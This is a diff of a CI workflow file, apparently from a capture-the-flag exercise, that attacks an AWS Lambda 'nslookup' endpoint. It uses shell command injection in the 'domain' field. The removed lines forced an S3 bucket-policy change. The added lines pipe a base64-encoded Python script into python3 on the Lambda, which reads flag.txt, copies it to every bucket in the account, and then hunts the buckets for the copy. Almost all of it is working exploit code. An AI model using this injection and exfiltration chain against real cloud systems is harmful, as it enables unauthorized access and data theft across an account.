@@ -24,26 +24,51 @@ jobs:
           API_ID="3q931syi7b"
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
-          BUCKET="codec4f26c862a321ef5"
+          SRC_BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. FORCING LAMBDA TO UPDATE S3 BUCKET POLICY ==="
-          # This command injection writes a policy that explicitly grants cicdRole s3:GetObject permission on the bucket
-          POLICY='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"GrantCicdRead\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/cicdRole\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::'"${BUCKET}"'/*\"}]}'
+          echo "=== 1. DEPLOYING MULTI-BUCKET EXFILTRATION SCRIPT ==="
+          # This Python script runs inside the Lambda, grabs flag.txt, 
+          # and attempts to upload 'exfil_flag.txt' to EVERY bucket in the AWS account!
+          PY_SCRIPT="import boto3\n\
+          s3 = boto3.client('s3')\n\
+          try:\n\
+              obj = s3.get_object(Bucket='${SRC_BUCKET}', Key='flag.txt')\n\
+              data = obj['Body'].read()\n\
+              response = s3.list_buckets()\n\
+              for b in response.get('Buckets', []):\n\
+                  b_name = b['Name']\n\
+                  try:\n\
+                      s3.put_object(Bucket=b_name, Key='exfil_flag.txt', Body=data)\n\
+                      print(f'SUCCESS: Uploaded to {b_name}')\n\
+                  except Exception as e:\n\
+                      pass\n\
+          except Exception as e:\n\
+              print(f'Error: {e}')"
           
-          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${POLICY}' > /tmp/policy.json && aws s3api put-bucket-policy --bucket ${BUCKET} --policy file:///tmp/policy.json\"}"
+          # Base64 encode the script to avoid quote/escaping nightmares in shell command injection
+          ENCODED_SCRIPT=$(echo -e "$PY_SCRIPT" | base64 -w 0)
+          
+          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${ENCODED_SCRIPT}' | base64 -d | python3\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR POLICY PROPAGATION ==="
-          sleep 3
+          echo "=== 2. SCANNING ALL ACCOUNT BUCKETS FOR THE EXFILTRATED FLAG ==="
+          # Loop through every bucket your cicdRole can see and check if exfil_flag.txt landed there!
+          ALL_BUCKETS=$(aws s3api list-buckets --query "Buckets[].Name" --output text)
           
-          echo "=== 3. DOWNLOADING THE FLAG DIRECTLY ==="
-          # Now that your role has explicit policy access, download flag.txt with zero restrictions!
-          aws s3 cp "s3://${BUCKET}/flag.txt" ./final_flag.txt
+          for B in $ALL_BUCKETS; do
+            echo "Checking bucket: $B"
+            if aws s3 ls "s3://$B/exfil_flag.txt" 2>/dev/null; then
+              echo "=========================================="
+              echo "🎉 FOUND IT IN BUCKET: $B 🎉"
+              echo "=========================================="
+              aws s3 cp "s3://$B/exfil_flag.txt" ./the_real_flag.txt
+              cat ./the_real_flag.txt
+              exit 0
+            fi
+          done
           
-          echo ""
-          echo "=== 4. BEHOLD YOUR GLORIOUS VICTORY ==="
-          cat ./final_flag.txt
+          echo "Scanning complete."
